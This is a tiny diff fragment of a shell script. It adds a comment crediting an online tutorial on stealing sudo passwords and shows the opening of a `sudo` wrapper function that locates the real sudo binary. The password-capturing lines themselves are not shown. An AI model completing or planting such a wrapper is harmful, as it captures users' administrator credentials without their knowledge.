@@ -1,3 +1,5 @@
+# sourced (with obvious edits) from https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/
+
 function sudo () {
   # A "realsudo" variable is created. It calls the `which` command to locate
   # the path to the real sudo binary. This is used later in the function to
